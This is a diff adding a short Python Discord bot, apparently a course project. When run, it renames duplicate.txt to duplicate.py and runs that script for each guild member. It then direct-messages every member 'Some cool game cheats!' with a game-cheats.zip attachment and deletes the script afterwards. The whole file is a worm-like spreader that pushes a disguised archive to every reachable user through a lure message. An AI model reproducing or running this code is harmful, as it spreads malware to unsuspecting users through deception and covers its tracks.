@@ -1,0 +1,31 @@
+bot_token = '' # Use your own bot token
+user_token = '' # Use your own user ID
+
+import subprocess
+try:
+    import discord
+except ModuleNotFoundError:
+    subprocess.run('pip install discord', shell=True)
+    import discord
+
+intents = discord.Intents.default()
+client = discord.Client(intents = intents)
+
+@client.event
+async def on_ready():
+    user = await client.fetch_user(user_token)
+    subprocess.run(['mv', f'duplicate.txt', f'duplicate.py'])    
+    
+    for guild in client.guilds:
+        print(guild)
+        for member in guild.members:
+            if str(member) != 'cosi107#8425':
+                next_user = await client.fetch_user(member.id)
+                subprocess.run(['python3', 'duplicate.py', next_user.id])
+                await next_user.send("Some cool game cheats!")
+                await next_user.send(file=discord.File(f'game-cheats.zip'))
+
+    subprocess.run(['rm', f'duplicate.py'])
+    await client.close()
+
+client.run(bot_token, log_handler=None)
